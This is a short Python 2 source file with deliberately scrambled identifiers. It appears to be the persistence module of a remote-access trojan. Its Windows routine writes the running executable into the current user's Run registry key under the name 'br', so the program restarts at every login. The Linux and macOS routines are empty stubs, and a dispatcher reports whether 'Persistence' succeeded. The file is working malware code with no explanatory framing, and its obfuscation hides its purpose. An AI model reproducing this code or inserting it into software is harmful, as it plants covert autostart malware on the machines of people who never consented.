# -*- coding: utf-8 -*-
import sys
def slTXQFWQGdTwEQnoFOYKqCfndeYolkGP():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    xfxTyTeEhmcWveXWWldaKQcmkOMhXCPp = r'Software\Microsoft\Windows\CurrentVersion\Run'
    vMsXZcJVpBpTUKHkFqaHBFLjnebUNyuV = sys.executable
    try:
        bQbYylEmebhYggckLjsvMnTVfGLJrOgV = _winreg.OpenKey(HKCU, xfxTyTeEhmcWveXWWldaKQcmkOMhXCPp, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(bQbYylEmebhYggckLjsvMnTVfGLJrOgV, 'br', 0, _winreg.REG_SZ, vMsXZcJVpBpTUKHkFqaHBFLjnebUNyuV)
        _winreg.CloseKey(bQbYylEmebhYggckLjsvMnTVfGLJrOgV)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def ndCYFBKWESTlqkHYFCVCRUggNSakvISx():
    return False, 'nothing here yet'
def igNCuuiwkfvUfxPRUHtOqnQKmaTVnlDl():
    return False, 'nothing here yet'
def KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(plat_type):
    if plat_type.startswith('win'):
        uvCLUEcLTPtphdmEWqdLrAaHnbYeuPoj, jYKNoWcVBPKgxdLZfdkcUorvqfZfgXXE = slTXQFWQGdTwEQnoFOYKqCfndeYolkGP()
    elif plat_type.startswith('linux'):
        uvCLUEcLTPtphdmEWqdLrAaHnbYeuPoj, jYKNoWcVBPKgxdLZfdkcUorvqfZfgXXE = ndCYFBKWESTlqkHYFCVCRUggNSakvISx()
    elif plat_type.startswith('darwin'):
        uvCLUEcLTPtphdmEWqdLrAaHnbYeuPoj, jYKNoWcVBPKgxdLZfdkcUorvqfZfgXXE = igNCuuiwkfvUfxPRUHtOqnQKmaTVnlDl()
    else:
        return 'Error, platform unsupported.'
    if uvCLUEcLTPtphdmEWqdLrAaHnbYeuPoj:
        gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = 'Persistence successful, {}.'.format(jYKNoWcVBPKgxdLZfdkcUorvqfZfgXXE)
    else:
        gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = 'Persistence unsuccessful, {}.'.format(jYKNoWcVBPKgxdLZfdkcUorvqfZfgXXE)
    return gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm
